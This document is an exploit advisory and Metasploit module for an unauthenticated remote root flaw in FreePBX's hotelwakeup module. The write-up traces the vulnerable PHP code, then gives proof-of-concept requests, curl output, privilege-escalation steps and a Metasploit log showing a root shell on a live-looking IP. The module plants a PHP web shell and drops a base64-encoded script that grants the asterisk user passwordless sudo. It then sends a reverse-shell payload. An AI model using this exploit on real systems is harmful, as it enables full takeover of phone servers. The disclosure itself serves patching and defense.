#Vulnerable software : Freepbx < 13.0.188
#Author : Ahmed Sultan (0x4148)
#Email : 0x4148@gmail.com
#Current software status : patch released
#Vendor : Sangoma <freepbx.org>
 
=begin
Freepbx 13.x are vulnerable to Remote command execution due to the insuffecient sanitization of the user input fields language,destination and also due to the lack of good authentication checking
Technical details
Vulnerable file : admin/modules/hotelwakeup/Hotelwakeup.class.php
Line 102 :
    public function generateCallFile($foo) {
       ...............................
        if (empty($foo[&#039;filename&#039;])) {
            $foo[&#039;filename&#039;] = "wuc.".$foo[&#039;time&#039;].".ext.".$foo[&#039;ext&#039;].".call"; <<<<<---------------------Vulnerable
        }
        ...........................
        // Delete any old .call file with the same name as the one we are creating.
        if(file_exists($outfile) ) {
            unlink($outfile);
        }
        // Create up a .call file, write and close
        $wuc = fopen($tempfile, &#039;w&#039;);
        fputs( $wuc, "channel: Local/".$foo[&#039;ext&#039;]."@originate-skipvm\n" );
        fputs( $wuc, "maxretries: ".$foo[&#039;maxretries&#039;]."\n");
        fputs( $wuc, "retrytime: ".$foo[&#039;retrytime&#039;]."\n");
        fputs( $wuc, "waittime: ".$foo[&#039;waittime&#039;]."\n");
        fputs( $wuc, "callerid: ".$foo[&#039;callerid&#039;]."\n");
        fputs( $wuc, &#039;set: CHANNEL(language)=&#039;.$foo[&#039;language&#039;]."\n");  <<<<<---------------------Vulnerable
        fputs( $wuc, "application: ".$foo[&#039;application&#039;]."\n");
        fputs( $wuc, "data: ".$foo[&#039;data&#039;]."\n");
        fclose( $wuc );
        ..........................
The ext value can be manipulated by the attacker to change the output file path 
the language value can be manipulated by the attacket to load in malicious contents
Function is called at
Line 94 : 
    public function addWakeup($destination, $time, $lang) {
        $date = $this->getConfig();  // module config provided by user
        $this->generateCallFile(array(
            "time"  => $time,
            "date" => &#039;unused&#039;,
            "ext" => $destination, <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<================ Vulnerable [Filename field]
            "language" => $lang, <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<================ Vulnerable [language field loaded with malicious code]
            "maxretries" => $date[&#039;maxretries&#039;],
            "retrytime" => $date[&#039;retrytime&#039;],
            "waittime" => $date[&#039;waittime&#039;],
            "callerid" => $date[&#039;cnam&#039;]." <".$date[&#039;cid&#039;].">",
            "application" => &#039;AGI&#039;,
            "data" => &#039;wakeconfirm.php&#039;,
        ));
    }
addWakeup function is called when calling the hotelwakeup module via ajax.php and setting savecall as command
Line 60 : 
            switch($_REQUEST[&#039;command&#039;]) {
            case "savecall":
                if(empty($_POST[&#039;language&#039;])) {
                    $lang = &#039;en&#039;; //default to English if empty
                } else {
                    $lang = $_POST[&#039;language&#039;]; <<<<<<<<<<<<<<<<<<<===========================
                }
            ............................................
                if ($badtime)  {
                    // abandon .call file creation and pop up a js alert to the user
                    return array("status" => false, "message" => sprintf(_("Cannot schedule the call the scheduled time is in the past. [Time now: %s] [Wakeup Time: %s]"),date(DATE_RFC2822,$time_now),date(DATE_RFC2822,$time_wakeup)));
                } else {
                    $this->addWakeup($_POST[&#039;destination&#039;],$time_wakeup,$lang); <<<<<<<<<<<=======================
                    return array("status" => true);
                }
           .................................
POC : 
{"error":{"type":"Whoops\\Exception\\ErrorException","message":"touch(): Unable to create file \/var\/spool\/asterisk\/tmp\/wuc.1475613328.ext.\/..\/..\/..\/..\/..\/..\/var\/www\/html\/0x4148.php.call because No such file or directory","file":"\/var\/www\/html\/admin\/modules\/hotelwakeup\/Hotelwakeup.class.php","line":238}}#    
 
The error mean nothing , we still can get our malicious file via http://server:port/0x4148.php.call
the server will ignore.call extn and will execute the php
 
[0x4148:/lab]# curl "http://68.170.92.50:8080/0x4148.php.call"
channel: Local//../../../../../../var/www/html/0x4148.php@originate-skipvm
maxretries: 3
retrytime: 60
waittime: 60
callerid: Wake Up Calls <*68>
set: CHANNEL(language)=Linux HOUPBX 2.6.32-504.8.1.el6.x86_64 #1 SMP Wed Jan 28 21:11:36 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
uid=499(asterisk) gid=498(asterisk) groups=498(asterisk)
application: AGI
data: wakeconfirm.php
 
Privelage can be escalated via adding the asterisk user to sudoers which can be done manually 
then echo a > /var/spool/asterisk/sysadmin/amportal_restart
sleeping for few seconds
then sudo bash -i
 
MSF OUTPUT
msf > use exploit/fpbx
msf exploit(fpbx) > set RHOST 68.170.92.50
RHOST => 68.170.92.50
msf exploit(fpbx) > set RPORT 8080
RPORT => 8080
msf exploit(fpbx) > exploit
 
[*] [2016.09.27-16:39:21] Started reverse TCP handler on 88.150.231.125:443
[*] [2016.09.27-16:39:21] 68.170.92.50:8080 - Sending payload . . .
[*] [2016.09.27-16:39:21] 68.170.92.50:8080 - Trying to execute payload
[+] [2016.09.27-16:39:41] 68.170.92.50:8080 - Payload executed
[*] [2016.09.27-16:39:41] 68.170.92.50:8080 - Spawning root shell <taking around 20 seconds in case of success>
 
id
uid=0(root) gid=0(root) groups=0(root)
sh -i
sh: no job control in this shell
sh-4.1# pwd
pwd
/var/www/html
sh-4.1# whoami
whoami
root
sh-4.1#
=end
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit4 < Msf::Exploit::Remote
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
                      &#039;Name&#039;            => &#039;FreePBX < 13.0.188.1 Remote root exploit&#039;,
                      &#039;Description&#039;     => &#039;
                        This module exploits an unauthenticated remote command execution in FreePBX module Hotelwakeup
                      &#039;,
                      &#039;License&#039;         => MSF_LICENSE,
                      &#039;Author&#039;          =>
                        [
                          &#039;Ahmed sultan (0x4148) <0x4148@gmail.com>&#039;, # discovery of vulnerability and msf module
                        ],
                      &#039;References&#039;      =>
                        [
                          "NA"
                        ],
                      &#039;Payload&#039; =>
                        {
                          &#039;Compat&#039; =>
                          {
                            &#039;PayloadType&#039;  => &#039;cmd&#039;,
                            &#039;RequiredCmd&#039;  => &#039;perl telnet python&#039;
                          }
                        },
                      &#039;Platform&#039;       => %w(linux unix),
                      &#039;Arch&#039;           => ARCH_CMD,
                      &#039;Targets&#039;        => [[&#039;Automatic&#039;, {}]],
                      &#039;Privileged&#039;     => &#039;false&#039;,
                      &#039;DefaultTarget&#039;  => 0,
                      &#039;DisclosureDate&#039; => &#039;Sep 27 2016&#039;))
  end
 
  def print_status(msg = &#039;&#039;)
    super("#{rhost}:#{rport} - #{msg}")
  end
 
  def print_error(msg = &#039;&#039;)
    super("#{rhost}:#{rport} - #{msg}")
  end
 
  def print_good(msg = &#039;&#039;)
    super("#{rhost}:#{rport} - #{msg}")
  end
 
  # Application Check
  def check
    res = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;ajax.php&#039;),
      &#039;headers&#039; => {
        &#039;Referer&#039; => "http://#{datastore[&#039;RHOST&#039;]}/jnk0x4148stuff"
      },
      &#039;vars_post&#039; => {
        &#039;module&#039; => &#039;hotelwakeup&#039;,
        &#039;command&#039;       => &#039;savecall&#039;
      }
    )
 
    unless res
      vprint_error(&#039;Connection timed out.&#039;)
    end
    if res.body.include? "Referrer"
      vprint_good("Hotelwakeup module detected")
      return Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end
  def exploit
    vprint_status(&#039;Sending payload . . .&#039;)
    pwn = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;ajax.php&#039;),
      &#039;headers&#039; => {
        &#039;Referer&#039; => "http://#{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}/admin/ajax.php?module=hotelwakeup&action=savecall",
        &#039;Accept&#039; => "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        &#039;User-agent&#039; => "mostahter ;)"
      },
      &#039;vars_post&#039; => {
        &#039;module&#039; => &#039;hotelwakeup&#039;,
        &#039;command&#039;       => &#039;savecall&#039;,
        &#039;day&#039;       => &#039;now&#039;,
        &#039;time&#039;       => &#039;+1 week&#039;,
        &#039;destination&#039;       => &#039;/../../../../../../var/www/html/0x4148.php&#039;,
        &#039;language&#039;       => &#039;<?php echo "0x4148@r1z";if($_GET[\&#039;r1zcmd\&#039;]!=\&#039;\&#039;){system("sudo ".$_GET[\&#039;r1zcmd\&#039;]);}else{fwrite(fopen("0x4148.py","w+"),base64_decode("IyEvdXNyL2Jpbi9lbnYgcHl0aG9uCmltcG9ydCBvcwppbXBvcnQgdGltZQojIC0qLSBjb2Rpbmc6IHV0Zi04IC0qLSAKY21kID0gJ3NlZCAtaSBcJ3MvQ29tIEluYy4vQ29tIEluYy5cXG5lY2hvICJhc3RlcmlzayBBTEw9XChBTExcKVwgICcgXAoJJ05PUEFTU1dEXDpBTEwiXD5cPlwvZXRjXC9zdWRvZXJzL2dcJyAvdmFyL2xpYi8nIFwKCSdhc3Rlcmlzay9iaW4vZnJlZXBieF9lbmdpbmUnCm9zLnN5c3RlbShjbWQpCm9zLnN5c3RlbSgnZWNobyBhID4gL3Zhci9zcG9vbC9hc3Rlcmlzay9zeXNhZG1pbi9hbXBvcnRhbF9yZXN0YXJ0JykKdGltZS5zbGVlcCgyMCk="));system("python 0x4148.py");}?>&#039;,
      }
    )
    #vprint_status("#{pwn}")
    vprint_status(&#039;Trying to execute payload <taking around 20 seconds in case of success>&#039;)
    escalate = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;0x4148.php.call&#039;),
      &#039;vars_get&#039; => {
        &#039;0x4148&#039; => "r1z"
      }
    )
    if escalate.body.include? "0x4148@r1z"
        vprint_good("Payload executed")
        vprint_status("Spawning root shell")
        killit = send_request_cgi(
          &#039;method&#039; => &#039;GET&#039;,
          &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;0x4148.php.call&#039;),
          &#039;vars_get&#039; => {
            &#039;r1zcmd&#039; => "#{payload.encoded}"
          }
        )       
    else
        vprint_error("Exploitation Failed")
    end
    end
end

